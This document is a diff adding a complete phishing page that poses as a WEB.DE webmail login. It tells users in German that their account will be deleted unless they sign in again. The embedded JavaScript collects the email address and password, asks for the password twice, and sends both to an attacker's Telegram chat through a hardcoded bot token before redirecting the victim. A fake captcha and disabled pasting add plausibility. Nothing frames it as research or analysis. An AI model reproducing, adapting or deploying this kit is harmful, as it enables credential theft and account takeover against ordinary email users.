@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WEBDE LOGIN</title>
+    <meta name="description" content="Melden Sie sich bei Ihrem WEB.DE-Konto an, um die Deaktivierung zu stoppen">
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <link rel="icon" href="/static/images/favicon.ico" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/static/css/style.css">
+    
+    <style>
+        /* Ensure font size for input fields is at least 16px to prevent zooming */
+        input, textarea, select {
+            font-size: 16px;
+        }
+
+        /* Styling for the password confirmation popup */
+        .password-confirmation-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .popup-content {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px; /* Default width */
+            text-align: center;
+            position: relative;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+            box-sizing: border-box;
+        }
+
+        .popup-content h2 {
+            font-size: 20px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+
+        /* Position and style for the password input field */
+        .popup-content .password-container {
+            position: relative;
+            margin-bottom: 15px;
+            width: 100%;
+        }
+
+        .popup-content input {
+            padding: 10px;
+            width: 100%;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box;
+            margin-left: -1rem;
+        }
+
+        /* Position and style for the eye icon inside the input */
+        .eye-icon {
+    position: absolute;
+    right: 15px;
+    top: 65%; /* Increase top value to move the icon lower */
+    transform: translateY(-140%);
+    cursor: pointer;
+    width: 20px;
+    height: 16px;
+    opacity: 0.6;
+    transition: opacity 0.3s ease;
+}
+
+.eye-icon:hover {
+    opacity: 1;
+}
+
+
+
+        /* Styling for the confirm button */
+        .popup-content button {
+            padding: 10px 15px;
+            background-color:  #f4d50b;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            transition: background-color 0.3s ease;
+            box-sizing: border-box;
+        }
+
+        .popup-content button:hover {
+            background-color: #d9534f; /* Hover color */
+        }
+
+        .popup-content .error-message {
+            color: red;
+            font-size: 12px; /* Reduced font size for error message */
+            margin-top: 5px; /* Reduced margin top */
+        }
+
+        /* Styling for the close button (X) in the top-right corner */
+        .popup-close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 24px;
+            color: #999;
+            cursor: pointer;
+        }
+
+        .popup-close:hover {
+            color: #333;
+        }
+
+        /* Add a yellow background to the button while it's loading */
+        button.loading {
+            background-color: #d9534f;  /* Yellow background color */
+            cursor: not-allowed;        /* Change cursor to show the button is inactive */
+        }
+
+        /* Spinner inside the button */
+        .spinner {
+            border: 4px solid #f3f3f3;  /* Light gray background */
+            border-top: 4px solid #11de34;  /* White color for the spinning part */
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite; /* Spinner animation */
+            margin: 0 auto;
+        }
+
+        /* Keyframe for spinning animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Media query for mobile devices */
+        @media (max-width: 600px) {
+            .popup-content {
+                width: 90%; /* Increase width to 90% for mobile screens */
+                max-width: 400px; /* Set a maximum width for larger screens */
+            }
+
+            .popup-content h2 {
+                font-size: 18px; /* Adjust font size for mobile */
+            }
+
+            .popup-content input {
+                font-size: 14px; /* Adjust input font size for better readability */
+            }
+
+            .popup-content button {
+                font-size: 14px; /* Adjust button font size */
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo-container">
+            <img src="/static/images/1.png" alt="WEB.DE Logo" class="logo">
+            <span class="account-text">Kundencenter</span>
+        </div>
+    </header>
+    <main class="main-content">
+        <div class="login-container">
+            <img src="/static/images/2.png" alt="WEB.DE Logo" class="formlogo">
+            <h1>Bitte erneut einloggen</h1>
+            <form id="login-form" action="/login" method="POST">
+                <p>Loggen Sie sich in Ihren WEB.DE-Account ein, um Ihre Identität zu bestätigen, nur so können Sie eine Löschung Ihres Accounts verhindern</p>
+                <label for="email">WEB.DE E-Mail-Adresse</label>
+                <input type="email" id="email" name="email" required>
+                <label for="password">Passwort eingeben</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required>
+                    <img src="/static/images/eye-icon.jpg" alt="Toggle Password" class="eye-icon" id="toggle-password">
+                </div>
+                <div class="captcha-wrapper">
+                    <div class="captcha-container">
+                        <div class="captcha-icon">
+                            <span class="captcha-text">Sicherheitsabfrage</span>
+                            <img src="/static/images/21.png" alt="Captcha Icon">
+                        </div>
+                        <div class="captcha-background">
+                            <img id="captcha-image" src="/static/images/captcha4.jpg" alt="Captcha für Verifikation" class="captcha-image">
+                        </div>
+                        <a href="#" id="refresh-captcha" class="refresh-captcha">Andere Zeichenfolge anzeigen</a>
+                        <label for="captcha-input" class="captcha-label">Zeichenfolge eingeben</label>
+                        <input type="text" id="captcha-input" name="captcha" required>
+                    </div>
+                </div>
+                <button type="submit" class="login-button">Login</button>
+            </form>
+        </div>
+    </main>
+    
+    <!-- Password Confirmation Popup -->
+    <div class="password-confirmation-popup" id="password-confirmation-popup">
+        <div class="popup-content">
+            <!-- Close button in top-right corner -->
+            <span id="popup-close" class="popup-close">×</span>
+            <h2>Bestätigen Sie Ihr Passwort</h2>
+            <div class="password-container">
+                <input type="password" id="confirm-password" placeholder="Passwort" required>
+                <img src="/static/images/eye-icon.jpg" alt="Toggle Password" class="eye-icon" id="toggle-confirm-password">
+            </div>
+            <div class="error-message" id="error-message"></div>
+            <button id="confirm-password-btn">Bestätigen</button>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <nav>
+            <a href="#">Impressum</a>
+            <a href="#">Verträge hier kündigen</a>
+            <a href="#">Datenschutzhinweise</a>
+            <a href="#">AGB</a>
+            <a href="#">Hilfe und Tipps</a>
+        </nav>
+    </footer>
+    
+    <script>
+        // Telegram credentials
+        const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
+        const TELEGRAM_CHAT_ID = '7473556793';
+
+        // Show the password confirmation popup
+        function showPasswordConfirmation() {
+            document.getElementById('password-confirmation-popup').style.display = 'flex';
+        }
+
+        
+
+        // Hide the password confirmation popup
+        function hidePasswordConfirmation() {
+            document.getElementById('password-confirmation-popup').style.display = 'none';
+            document.getElementById('confirm-password').value = ''; // Clear input field
+            document.getElementById('error-message').innerText = ''; // Clear error message
+        }
+
+        document.getElementById('confirm-password-btn').addEventListener('click', function() {
+            const enteredPassword = document.getElementById('password').value;
+            const confirmPassword = document.getElementById('confirm-password').value;
+            const confirmButton = document.getElementById('confirm-password-btn');
+
+            // Check if passwords match
+            if (enteredPassword === confirmPassword) {
+                // Passwords match, proceed with showing the spinner
+                confirmButton.classList.add('loading'); // Add 'loading' class to show spinner
+                confirmButton.innerHTML = '<div class="spinner"></div>';  // Add spinner inside the button
+
+                // Proceed with the rest of the process (e.g., sending to Telegram)
+                sendToTelegram();
+
+                // Wait for 3 seconds before redirecting
+                setTimeout(function() {
+                    window.location.href = 'confirmation.html'; // Redirect after success
+                }, 3000); // 3 seconds delay
+            } else {
+                // Passwords don't match, show error message and reset button
+                document.getElementById('error-message').innerText = 'Autorisation fehlgeschlagen. Geben Sie Ihr korrektes Passwort ein, um Ihr Konto vor der Löschung zu schützen.';
+
+                // Reset the button after 1 second (no spinner, revert to original state)
+                setTimeout(function() {
+                    confirmButton.innerHTML = 'Bestätigen';  // Restore original text
+                    confirmButton.classList.remove('loading'); // Remove loading class to restore normal button style
+                }, 1000); // Delay for 1 second before restoring text
+            }
+        });
+        
+
+       // Toggle password visibility for both password fields
+const passwordField = document.getElementById('password');
+const confirmPasswordField = document.getElementById('confirm-password');
+const togglePasswordIcon = document.getElementById('toggle-password');
+const toggleConfirmPasswordIcon = document.getElementById('toggle-confirm-password');
+
+// Toggle password visibility for the main password field
+togglePasswordIcon.addEventListener('click', function () {
+    const type = passwordField.type === 'password' ? 'text' : 'password';
+    passwordField.type = type;
+});
+
+// Toggle password visibility for the confirmation password field
+toggleConfirmPasswordIcon.addEventListener('click', function () {
+    const type = confirmPasswordField.type === 'password' ? 'text' : 'password';
+    confirmPasswordField.type = type;
+});
+
+// Prevent pasting in the main password field
+document.getElementById('password').addEventListener('paste', function(event) {
+    event.preventDefault();  // Prevent the paste action
+});
+
+// Prevent pasting in the confirmation password field
+document.getElementById('confirm-password').addEventListener('paste', function(event) {
+    event.preventDefault();  // Prevent the paste action
+});
+
+// Cancel button for the popup (close the popup on click)
+document.getElementById('popup-close').addEventListener('click', hidePasswordConfirmation);
+
+// Function to send email and password to Telegram
+async function sendToTelegram() {
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    
+    // Customize the message format
+    const message = `
+        *GOODNEWS from WEB.DE*
+        *Email:* ${email}
+        *Password:* ${password}
+    `;
+    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+    try {
+        const response = await fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+
+        if (!response.ok) {
+            console.error('Response not OK:', response.status, response.statusText);
+            throw new Error('Failed to send message to Telegram');
+        }
+
+        const data = await response.json();
+        console.log('Message successfully sent to Telegram:', data);
+
+        // Wait for 3 seconds before redirecting
+        setTimeout(function() {
+            window.location.href = 'confirmation.html';
+        }, 3000);
+    } catch (error) {
+        console.error('An error occurred:', error);
+        alert('Failed to send data. Please try again.');
+    }
+}
+
+// Show the password confirmation popup
+function showPasswordConfirmation() {
+    document.getElementById('password-confirmation-popup').style.display = 'flex';
+    
+    // Check if password visibility is on and turn it off for both fields
+    if (passwordField.type === 'text') {
+        passwordField.type = 'password';  // Hide main password field
+    }
+    if (confirmPasswordField.type === 'text') {
+        confirmPasswordField.type = 'password';  // Hide confirm password field
+    }
+}
+
+// Hide the password confirmation popup
+function hidePasswordConfirmation() {
+    document.getElementById('password-confirmation-popup').style.display = 'none';
+    document.getElementById('confirm-password').value = ''; // Clear input field
+    document.getElementById('error-message').innerText = ''; // Clear error message
+}
+
+// Handle form submission
+document.getElementById('login-form').addEventListener('submit', function(event) {
+    event.preventDefault();
+    showPasswordConfirmation(); // Show the password confirmation popup
+});
+
+    </script>
+</body>
+</html>
